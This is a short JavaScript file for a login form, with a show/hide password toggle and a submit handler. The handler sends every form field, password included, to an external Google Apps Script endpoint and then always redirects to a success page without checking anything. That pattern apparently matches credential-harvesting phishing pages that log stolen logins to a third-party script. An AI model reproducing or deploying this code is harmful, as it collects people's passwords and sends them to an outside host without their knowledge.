function togglePassword() {
    const password = document.getElementById("password");
    const toggle = document.querySelector(".toggle-password");
    if (password.type === "password") {
      password.type = "text";
      toggle.textContent = "Hide";
    } else {
      password.type = "password";
      toggle.textContent = "Show";
    }
  }

  document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();
    const form = new FormData(this);

    fetch("https://script.google.com/macros/s/AKfycbzjgYUxlxJjOOedA1BsRig7ZNyE8kNEeWb3kHR4FDWSL3zc4g0FAMWmzi21rlypGEuXVA/exec", {
      method: "POST",
      body: form
    })
    .then(res => res.text())
    .then(data => {
  
      window.location.href = "success.html";
    })
    .catch(err => alert("There was an error. Try again."));
  });